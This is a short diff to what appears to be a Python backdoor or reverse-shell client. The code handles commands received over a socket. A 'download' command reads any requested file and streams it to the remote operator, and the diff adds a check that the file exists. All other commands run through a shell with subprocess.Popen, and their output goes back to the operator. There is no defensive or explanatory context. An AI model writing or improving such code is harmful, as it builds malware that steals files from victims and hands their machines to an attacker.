@@ -47,13 +47,19 @@ user:{user}
              client.send(currentUser)
              
         elif command.split(" ")[0] == "download":
-            with open(command.split(" ")[1], "rb") as f:
-                file_data = f.read(1024)
-                while file_data:
-                    client.send(file_data)
+            file_name=command.split(" ")[1]
+            checkFile=os.path.isfile(file_name)
+            if checkFile==False:
+                client.send("NO".encode())
+            else:
+                client.send("Ok".encode())
+                with open(command.split(" ")[1], "rb") as f:
                     file_data = f.read(1024)
-                sleep(2)
-                client.send("DONE".encode())
+                    while file_data:
+                        client.send(file_data)
+                        file_data = f.read(1024)
+                    sleep(2)
+                    client.send("DONE".encode())
         else:
             op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
             output_error=op.stderr.read()
